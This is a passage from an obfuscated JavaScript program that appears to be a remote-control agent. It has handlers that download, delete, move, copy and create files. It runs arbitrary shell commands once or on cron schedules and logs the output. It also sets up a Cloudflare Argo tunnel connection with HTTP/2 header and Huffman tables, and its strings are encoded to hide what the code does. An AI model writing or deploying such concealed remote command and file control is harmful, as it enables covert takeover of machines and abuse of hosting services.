            'path': a0n['relative'](a0O['FILE_ROOT'], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g[c8(0x187)]
        };
    }
    static async ['downloadFile'](a) {
        const c9 = a0aQ, b = {
                'ZmonY': function (h, i) {
                    return h(i);
                },
                'HlFpc': c9(0x47d)
            }, c = a0n[c9(0x249)](a0O['FILE_ROOT'], a);
        if (!b[c9(0x6d1)](a0V, c))
            throw new Error('Access\x20denied:\x20path\x20outside\x20root');
        if (!a0l[c9(0x617)](c))
            throw new Error(b[c9(0x1d4)]);
        const d = a0l[c9(0x2f4)](c), f = a0l[c9(0x5db)](c), g = a0v[c9(0x56d)](f);
        return {
            'path': a0n[c9(0x376)](a0O[c9(0x725)], c),
            'content': g,
            'size': d[c9(0x316)]
        };
    }
    static async [a0aQ(0x449)](a) {
        const ca = a0aQ, b = {
                'hmMeF': function (d, f) {
                    return d(f);
                },
                'LcOxS': ca(0x5d2),
                'KZXMd': ca(0x4d4),
                'sBmMq': ca(0x76e),
                'LULus': ca(0x3bf)
            }, c = [];
        for (const d of a) {
            const f = a0n['resolve'](a0O[ca(0x725)], d);
            if (!b[ca(0x122)](a0V, f)) {
                c['push']({
                    'path': d,
                    'status': b[ca(0x456)]
                });
                continue;
            }
            try {
                if (a0l[ca(0x617)](f)) {
                    const g = a0l[ca(0x2f4)](f);
                    g[ca(0x467)]() ? a0l[ca(0x6f4)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l['unlinkSync'](f), c['push']({
                        'path': d,
                        'status': b['KZXMd']
                    });
                } else
                    c[ca(0x385)]({
                        'path': d,
                        'status': b[ca(0x39d)]
                    });
            } catch (h) {
                c[ca(0x385)]({
                    'path': d,
                    'status': b[ca(0x2e2)],
                    'message': h['message']
                });
            }
        }
        return c;
    }
    static async [a0aQ(0x18c)](a) {
        const cb = a0aQ, b = {
                'IVDOn': function (d, f) {
                    return d(f);
                },
                'sqJsT': cb(0x5d2),
                'fbdna': 'error'
            }, c = [];
        for (const [d, f] of Object[cb(0x73f)](a)) {
            const g = a0n[cb(0x249)](a0O[cb(0x725)], d), h = a0n['resolve'](a0O['FILE_ROOT'], f);
            if (!a0V(g) || !b[cb(0x506)](a0V, h)) {
                c[cb(0x385)]({
                    'from': d,
                    'to': f,
                    'status': b[cb(0x484)]
                });
                continue;
            }
            try {
                const i = a0n[cb(0x40b)](h);
                !a0l['existsSync'](i) && a0l['mkdirSync'](i, { 'recursive': !![] }), a0l[cb(0x73b)](g, h), c[cb(0x385)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': b['fbdna'],
                    'message': j[cb(0x257)]
                });
            }
        }
        return c;
    }
    static async [a0aQ(0x712)](a) {
        const cc = a0aQ, b = {
                'pAGBh': function (d, f, g) {
                    return d(f, g);
                },
                'NIyad': function (d, f) {
                    return d(f);
                },
                'sRLoN': function (d, f) {
                    return d(f);
                }
            }, c = [];
        for (const [d, f] of Object[cc(0x73f)](a)) {
            const g = a0n[cc(0x249)](a0O[cc(0x725)], d), h = a0n[cc(0x249)](a0O['FILE_ROOT'], f);
            if (!b[cc(0x399)](a0V, g) || !b[cc(0x36f)](a0V, h)) {
                c[cc(0x385)]({
                    'from': d,
                    'to': f,
                    'status': cc(0x5d2)
                });
                continue;
            }
            try {
                if (!a0l[cc(0x617)](g)) {
                    c[cc(0x385)]({
                        'from': d,
                        'to': f,
                        'status': 'not_found'
                    });
                    continue;
                }
                const i = a0n['dirname'](h);
                !a0l[cc(0x617)](i) && a0l[cc(0x389)](i, { 'recursive': !![] });
                const j = a0l[cc(0x2f4)](g);
                if (j[cc(0x467)]()) {
                    if (a0l[cc(0x2fd)])
                        a0l[cc(0x2fd)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const cd = cc;
                            if (a0l[cd(0x2f4)](l)['isDirectory']()) {
                                if (!a0l[cd(0x617)](m))
                                    a0l[cd(0x389)](m, { 'recursive': !![] });
                                for (const n of a0l[cd(0x5ef)](l)) {
                                    b[cd(0x231)](k, a0n[cd(0x6e2)](l, n), a0n['join'](m, n));
                                }
                            } else
                                a0l[cd(0x36e)](l, m);
                        };
                        b[cc(0x231)](k, g, h);
                    }
                } else
                    a0l['copyFileSync'](g, h);
                c[cc(0x385)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[cc(0x385)]({
                    'from': d,
                    'to': f,
                    'status': cc(0x3bf),
                    'message': l[cc(0x257)]
                });
            }
        }
        return c;
    }
    static async [a0aQ(0x6b3)](a) {
        const ce = a0aQ, b = {
                'UCiwG': function (d, f) {
                    return d(f);
                },
                'zMNrJ': ce(0x74b)
            }, c = a0n[ce(0x249)](a0O[ce(0x725)], a);
        if (!b[ce(0x42a)](a0V, c))
            throw new Error(b[ce(0x4d5)]);
        return a0l[ce(0x389)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0n['relative'](a0O[ce(0x725)], c)
        };
    }
}
class a0X {
    static [a0aQ(0x28b)] = new Map();
    static [a0aQ(0x41c)](a, b) {
        const cf = a0aQ, c = {
                'FAMmS': function (d, f) {
                    return d > f;
                },
                'ToCTd': function (d, f) {
                    return d - f;
                }
            };
        a[cf(0x385)](b), c[cf(0x523)](a[cf(0x54b)], a0O[cf(0x22f)]) && a['splice'](0x0, c[cf(0x28a)](a[cf(0x54b)], a0O[cf(0x22f)]));
    }
    static [a0aQ(0x3a8)](a, b, c, d, f = null) {
        const cg = a0aQ, g = new Date()[cg(0x1ab)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + cg(0x1bf) + a + cg(0x375) + c + '\x0a' + (b?.['trim']() || '')
        };
    }
    static ['getOnetimeTasks']() {
        const ch = a0aQ;
        return {
            'status': 'ok',
            'count': a0O[ch(0x46c)][ch(0x54b)],
            'tasks': a0O[ch(0x46c)]
        };
    }
    static async [a0aQ(0x22d)](a) {
        const ci = a0aQ, b = {
                'iwjhA': function (d, f) {
                    return d < f;
                },
                'YPZmI': ci(0x783)
            };
        a0O[ci(0x46c)] = a || [], a0O['InitTask'] = !![];
        const c = [];
        for (let d = 0x0; b['iwjhA'](d, a0O['onetasks'][ci(0x54b)]); d++) {
            const f = a0O[ci(0x46c)][d], g = await a0U[ci(0x59e)](f), h = this[ci(0x3a8)](f, g['result'], g[ci(0x5fd)], b[ci(0x41b)]);
            this['_appendLog'](a0O['onetimetasks_log'], h), c[ci(0x385)]({
                'index': d,
                'cmd': f,
                'exitcode': g[ci(0x5fd)],
                'output': g[ci(0x164)],
                'status': g[ci(0x5fd)] === 0x0 ? 'ok' : ci(0x3bf)
            });
        }
        return a0O[ci(0x57c)] = ![], {
            'status': 'ok',
            'count': a0O[ci(0x46c)]['length'],
            'tasks': a0O[ci(0x46c)],
            'executed': c
        };
    }
    static ['getCronTasks']() {
        const cj = a0aQ;
        return {
            'status': 'ok',
            'count': Object[cj(0x4f9)](a0O[cj(0x1cd)])[cj(0x54b)],
            'tasks': a0O[cj(0x1cd)]
        };
    }
    static ['setCronTasks'](a) {
        const ck = a0aQ, b = {
                'uccKC': function (d, f) {
                    return d === f;
                },
                'qyOyt': ck(0x2c0),
                'gaFoj': function (d, f) {
                    return d === f;
                },
                'FKWce': ck(0x283),
                'jaRHz': function (d, f) {
                    return d || f;
                },
                'XYiGv': function (d, f) {
                    return d > f;
                },
                'dyEZt': ck(0x3bf),
                'EfsTh': function (d, f) {
                    return d - f;
                }
            };
        this[ck(0x28b)]['forEach'](d => {
            const cl = ck;
            b[cl(0x42c)](typeof d[cl(0x357)], b[cl(0x334)]) && d[cl(0x357)](), b[cl(0x1c6)](typeof d['destroy'], b['qyOyt']) && d['destroy']();
        }), this['cronJobs'][ck(0x4d1)]();
        const c = [];
        for (const d of Object[ck(0x4f9)](b[ck(0x77a)](a, {}))) {
            !a0s[ck(0x31b)](d) && c['push'](d);
        }
        if (b[ck(0x4f4)](c[ck(0x54b)], 0x0))
            return {
                'status': b[ck(0x262)],
                'message': ck(0x225) + c[ck(0x6e2)](',\x20'),
                'valid_count': b['EfsTh'](Object['keys'](b[ck(0x77a)](a, {}))[ck(0x54b)], c[ck(0x54b)])
            };
        a0O[ck(0x1cd)] = b['jaRHz'](a, {});
        for (const [f, g] of Object[ck(0x73f)](a0O['crontasks'])) {
            const h = a0s[ck(0x436)](f, async () => {
                const cm = ck, i = await a0U[cm(0x59e)](g), j = this['_formatLogEntry'](g, i[cm(0x164)], i[cm(0x5fd)], b[cm(0x64e)], f);
                this['_appendLog'](a0O[cm(0x6e1)], j);
            });
            this['cronJobs'][ck(0x2c3)](f, h);
        }
        return a0O['cronloop'] = b['XYiGv'](Object[ck(0x4f9)](a0O[ck(0x1cd)])[ck(0x54b)], 0x0), {
            'status': 'ok',
            'count': Object[ck(0x4f9)](a0O[ck(0x1cd)])[ck(0x54b)],
            'tasks': a0O['crontasks']
        };
    }
    static [a0aQ(0x11c)]() {
        const cn = a0aQ;
        return {
            'onetime': {
                'pending': a0O['InitTask'],
                'count': a0O[cn(0x46c)][cn(0x54b)]
            },
            'cron': {
                'active': a0O[cn(0x706)],
                'count': Object['keys'](a0O['crontasks'])[cn(0x54b)],
                'check_interval': a0O[cn(0x432)]
            }
        };
    }
    static ['getOnetimeLogs'](a = 0x32) {
        const co = a0aQ, b = a0O[co(0x66d)]['slice'](-a);
        return {
            'status': 'ok',
            'count': b[co(0x54b)],
            'logs': b
        };
    }
    static [a0aQ(0x5e3)](a = 0x32) {
        const cp = a0aQ, b = a0O[cp(0x6e1)][cp(0x23b)](-a);
        return {
            'status': 'ok',
            'count': b[cp(0x54b)],
            'logs': b
        };
    }
    static ['clearOnetimeLogs']() {
        const cq = a0aQ, a = { 'vPggo': 'onetime' }, b = a0O['onetimetasks_log'][cq(0x54b)];
        return a0O['onetimetasks_log'] = [], {
            'status': 'ok',
            'cleared': a[cq(0x77d)]
        };
    }
    static [a0aQ(0x2ec)]() {
        const cr = a0aQ, a = { 'SNFvf': cr(0x283) }, b = a0O[cr(0x6e1)][cr(0x54b)];
        return a0O['crontasks_log'] = [], {
            'status': 'ok',
            'cleared': a['SNFvf']
        };
    }
    static [a0aQ(0x275)]() {
        const cs = a0aQ, a = {
                'GjZkY': function (g, h) {
                    return g - h;
                },
                'gHGPF': function (g, h) {
                    return g - h;
                }
            }, b = a0O[cs(0x66d)]['filter'](g => g[cs(0x5fd)] === 0x0)[cs(0x54b)], c = a[cs(0x27d)](a0O['onetimetasks_log'][cs(0x54b)], b), d = a0O[cs(0x6e1)][cs(0x6ab)](g => g['exitcode'] === 0x0)[cs(0x54b)], f = a[cs(0x3e7)](a0O['crontasks_log'][cs(0x54b)], d);
        return {
            'onetime': {
                'total_logged': a0O['onetimetasks_log'][cs(0x54b)],
                'max_capacity': a0O[cs(0x22f)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0O['crontasks_log'][cs(0x54b)],
                'max_capacity': a0O[cs(0x22f)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async [a0aQ(0x255)]() {
        const ct = a0aQ, a = [];
        for (let b = 0x0; b < a0O[ct(0x46c)][ct(0x54b)]; b++) {
            const c = a0O[ct(0x46c)][b], d = await a0U[ct(0x59e)](c), f = this[ct(0x3a8)](c, d[ct(0x164)], d[ct(0x5fd)], ct(0x783));
            this[ct(0x41c)](a0O[ct(0x66d)], f), a['push']({
                'cmd': c,
                'exitcode': d[ct(0x5fd)],
                'output': d[ct(0x164)],
                'timeout': d[ct(0x59b)]
            });
        }
        return a0O[ct(0x57c)] = ![], {
            'status': 'ok',
            'executed': a['length'],
            'results': a
        };
    }
}
const a0Y = a0aQ(0x61e), a0Z = [
        'region1.v2.argotunnel.com',
        a0aQ(0x367)
    ], a0a0 = 0x1ea4, a0a1 = 'cf-cloudflared-proxy-connection-upgrade', a0a2 = a0aQ(0x447), a0a3 = 0x4000, a0a4 = [
        [
            ':authority',
            ''
        ],
        [
            a0aQ(0x13f),
            'GET'
        ],
        [
            a0aQ(0x13f),
            'POST'
        ],
        [
            a0aQ(0x555),
            '/'
        ],
        [
            a0aQ(0x555),
            a0aQ(0x6ea)
        ],
        [
            a0aQ(0x1cc),
            'http'
        ],
        [
            a0aQ(0x1cc),
            a0aQ(0x24e)
        ],
        [
            a0aQ(0x415),
            a0aQ(0x2ac)
        ],
        [
            a0aQ(0x415),
            a0aQ(0x1b3)
        ],
        [
            a0aQ(0x415),
            '206'
        ],
        [
            a0aQ(0x415),
            '304'
        ],
        [
            a0aQ(0x415),
            a0aQ(0x297)
        ],
        [
            a0aQ(0x415),
            a0aQ(0x4bb)
        ],
        [
            a0aQ(0x415),
            '500'
        ],
        [
            'accept-charset',
            ''
        ],
        [
            a0aQ(0x421),
            a0aQ(0x2d0)
        ],
        [
            a0aQ(0x238),
            ''
        ],
        [
            'accept-ranges',
            ''
        ],
        [
            'accept',
            ''
        ],
        [
            a0aQ(0x19e),
            ''
        ],
        [
            a0aQ(0x439),
            ''
        ],
        [
            a0aQ(0x2dd),
            ''
        ],
        [
            'authorization',
            ''
        ],
        [
            'cache-control',
            ''
        ],
        [
            a0aQ(0x14a),
            ''
        ],
        [
            a0aQ(0x72c),
            ''
        ],
        [
            a0aQ(0x4d8),
            ''
        ],
        [
            a0aQ(0x311),
            ''
        ],
        [
            a0aQ(0x15a),
            ''
        ],
        [
            'content-range',
            ''
        ],
        [
            a0aQ(0x464),
            ''
        ],
        [
            a0aQ(0x5bf),
            ''
        ],
        [
            a0aQ(0x269),
            ''
        ],
        [
            a0aQ(0x3e5),
            ''
        ],
        [
            a0aQ(0x37f),
            ''
        ],
        [
            a0aQ(0x58a),
            ''
        ],
        [
            a0aQ(0x6ef),
            ''
        ],
        [
            'host',
            ''
        ],
        [
            a0aQ(0x58e),
            ''
        ],
        [
            a0aQ(0x743),
            ''
        ],
        [
            a0aQ(0x382),
            ''
        ],
        [
            a0aQ(0x34c),
            ''
        ],
        [
            a0aQ(0x6d0),
            ''
        ],
        [
            a0aQ(0x1d1),
            ''
        ],
        [
            a0aQ(0x1e2),
            ''
        ],
        [
            a0aQ(0x1e1),
            ''
        ],
        [
            a0aQ(0x516),
            ''
        ],
        [
            a0aQ(0x66a),
            ''
        ],
        [
            'proxy-authorization',
            ''
        ],
        [
            'range',
            ''
        ],
        [
            a0aQ(0x3eb),
            ''
        ],
        [
            a0aQ(0x1af),
            ''
        ],
        [
            a0aQ(0x4a9),
            ''
        ],
        [
            a0aQ(0x2b7),
            ''
        ],
        [
            a0aQ(0x21e),
            ''
        ],
        [
            a0aQ(0x1d5),
            ''
        ],
        [
            a0aQ(0x53e),
            ''
        ],
        [
            a0aQ(0x332),
            ''
        ],
        [
            a0aQ(0x6f9),
            ''
        ],
        [
            a0aQ(0x271),
            ''
        ],
        [
            a0aQ(0x4ce),
            ''
        ]
    ], a0a5 = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0a6 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0a7() {
    const cu = a0aQ, a = {
            'kqdLc': function (c, d) {
                return c < d;
            },
            'snAqK': function (c, d) {
                return c - d;
            },
            'SdBHK': function (c, d) {
                return c >= d;
            },
            'aQapd': function (c, d) {
                return c >> d;
            },
            'cmStr': function (c, d) {
                return c === d;
            },
            'ZiVRL': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a[cu(0x145)](c, a0a5[cu(0x54b)]); c++) {
        const d = a0a5[c], f = a0a6[c];
        let g = b;
        for (let h = a[cu(0x62d)](f, 0x1); a[cu(0x33e)](h, 0x0); h--) {
            const i = a[cu(0x500)](d, h) & 0x1;
            a['cmStr'](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                a[cu(0x152)](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0a8 = a0a7();
function a0a() {
    const fJ = [
        'BeD6z2u',
        'sMLvsve',
        'l3bYB2mVy3b1Aw5MBW',
        'rK1KC1y',
        'uhfpzfe',
        'vvDds1q',
        'A2v2qxO',
        'vNznvw8',
        'y3jVBMXVB3a',
        'ANnVBG',
        'D2vUy2W',
        'C3rYDwn0uhrY',
        'tM5jvfG',
        'B3bLBKnVBNrYB2W',
        'y29SCW',
        'z2v0tg9JywXjuhy0',
        'D1jfDKK',
        'AxLhr1u',
        'BxnNuMvZB2X2zxjZ',
        'ufjptvbux0nptu1btKq',
        'y29WEuzPBgvZ',
        'C3rHDhvZq29Kzq',
        'zxrJD3O',
        'r1zbs3m',
        'DMrmr08',
        'rKLmrv9bvurjvf9mt0C',
        'D0DpvNK',
        'zxHLy3v0ywjSzq',
        'ANfqrge',
        's05btuu',
        'nNWZFdv8mxWYFdb8nhW3',
        'rMHxzuW',
        'teHYAuG',
        'txrOwMS',
        'C21fEee',
        'vvPuCwS',
        'Bw9Kzq',
        'zK1QwKC',
        'sw5PDgLHBgL6Aw5NifrLBxblzxLnyw5Hz2vYlI4U',
        'rKLmrv9st09u',
        's05btuvFs0vz',
        'rMfPBgvKihrVigXVywqGBM9PC2uTyY53yxnTig1VzhvSzq',
        'y21KihjLCxvPCMvK',
        'B1DkwKu',
        't0TbA04',
        'tKDUuee',
        'y29UDgvUDc1LBMnVzgLUzW',
        'DhvUBMvSu2vJCMv0',
        'z2v0q29UDgfPBMvYtwvTB3j5',
        'EK9nuNy',
        'BgXMCgK',
        'v2DmuLe',
        'wMPJA2e',
        'ChjVy2vZCW',
        'DxbNCMfKzq',
        'zfj2vK8',
        'x2DLDfzPCNr1ywXPEMf0Aw9U',
        'y2yTAw50lq',
        'svb2na',
        't3fZD2q',
        'vNP5sxu',
        'CMvUyw1Lu3LUyW',
        'sunwywy',
        'qxngs3a',
        'ALfOy0m',
        'zw50CMLLCW',
        'Ahz6u3y',
        'CM91BMq',
        'vgLTzxn0yw1Wigv4CgLYzwq6igrPzMy9',
        'AwyTBw9KAwzPzwqTC2LUy2u',
        'ruzAvgy',
        'BM9PC2vFA2v5',
        'Ec1HzxmTzw5JCNLWDgvK',
        'Bw9Kzv9Vy3rHBa',
        'l3r1BM5LBa',
        'A2vYBMvSx3zLCNnPB24',
        'wc1oB25Jzq',
        'qwnJzxnZigrLBMLLzdOGCgf0AcbVDxrZAwrLihjVB3q',
        'x3zLCMLMEvDPDgG',
        'u3LfzfG',
        'B3DUzxi',
        'C3vIyxjYyxK',
        'zw5KC1DPDgG',
        'x3nWBgL0qw5KrMLUAxnO',
        'A1zPr1a',
        'sfbbq0SGDgfIBguGC2L6zsbLEgnLzwrZigXPBwL0',
        'C29YDa',
        'CNbYwei',
        's2zuv08',
        'Cgf0Ahm',
        'uu5pqLe',
        'AgvHzgvYCW',
        'rxDNANC',
        'BM8GCgvLCIbJzxj0AwzPy2f0zq',
        'x2v4CgLYzun1CNjLBNq',
        'mJq4mZK4qvDqvefL',
        'CgvYBwLZC2LVBNm',
        'tvz3Ehe',
        'wxzwwwG',
        'BLzpC1y',
        'y255rw8',
        'zu9stxq',
        '8j+uJcdLRQlMIlFNQ6/KUlVLIQJMLQ3LVia',
        'u25HuLe',
        'y29UBMvJDa',
        'y3jLyxrLvMvYAwz5',
        'D3jPDgvvsw50mZjmrq',
        'wNv1sve',
        'v2nlCeW',
        'u0rvsfi',
        'r3vmB0K',
        'sMvXwue',
        'BM90x2zVDw5K',
        'rLzAtee',
        'ihn0yxj0zwqGB24G',
        'CMvJDKnPCgHLCG',
        'q29UDhjVBgXLCG',
        'Aw52ywXPzcbiuefdsYbPBMrLEa',
        'mhWZFdv8nhWYFde',
        'l2fWAs90yxnRl29UzxrPBwuVzxHLy3v0zq',
        'yMfTzwS',
        'zgDrtvO',
        'zMTXt2K',
        'vffWwfy',
        'AMfsshO',
        'Ec1VCMLNAw5HBc1WyxrO',
        'Bgrtq24',
        'DLbNz28',
        'D3rfz0y',
        'DgfN',
        'z2vUzxjHDgvtAw5NBgu',
        'y21K',
        'ihvWBg9HzgvKlIbxywL0Aw5NigzVCIbYzw1HAw5PBMCGyMXVy2TZlG',
        'B25LDgLTzq',
        'w+E7IoERR+s8MUIVNsa',
        'Dw5Oyw5KBgvKuMvQzwn0Aw9U',
        'DMvYAwz5u2LNBMf0DxjL',
        'zw5QrKW',
        'x1niwKfmx05btuvFq0HbuLm',
        'r05JEwi',
        't1busu9ouW',
        'C3rVChbLza',
        'uuPKtvK',
        'C29Tzq',
        'CxvPy2SGDhvUBMvSihnLy3jLDcbOyxmGyw4GDw5LEhbLy3rLzcb0ExbL',
        'AdiUy2z0Dw5UzwWUy29T',
        'BxrPBwu',
        'A2v5x2LK',
        'txPMC2C',
        'zwnKC2fFChvIBgLJx2TLEq',
        'zgLZDhjV',
        'veziAge',
        'C0fXuxG',
        'AgfZ',
        'EujgzK8',
        'tKzuqK4',
        'B216ywC',
        'sujMrM4',
        'l2fWAs90yxnRl3n0yxr1CW',
        'z2v0vgfZA1n0yxr1CW',
        'ug9Jq3C',
        'zhLUyw1PyW',
        'y2zqs1e',
        'q0Xtr1i',
        'uxPyrhu',
        'Ag1nzuy',
        'zNntAxPL',
        'zNvKAwq',
        'CfLxrKK',
        's0vQvKS',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTsgvHzgvYCW',
        'BgXyuuW',
        'wMPjvK8',
        'CMvNAxn0CMf0Aw9UihvUAw9Uia',
        'odaWma',
        'zg93BMXVywrgAwXL',
        'sKfMB3m',
        'rurRy0y',
        'D1rqrgW',
        'BwX6sLy',
        '8j+tPIbBq2fJAgvDifn0yxr1CYdLKB3KUk3NM5hMJQFNVjpLRzJJGii',
        'x3n0yxr1C19MzxrJAf9WCM9TAxnL',
        'oNbYB3rVy29S',
        'qxv0AgvUDgLJyxrPB24GzMfPBgvKoIbjBNzHBgLKifrVA2vU',
        '8j+uKsbBvgvTCeTLEv0G5PAW5lI05PE25A+g6zkL5BEY55sF5OIqoIbRzxLFAwq9',
        'AgvHzgvY',
        'AhjJBgK',
        'l3bYB2mVC2vSzI9TB3vUDgLUzM8',
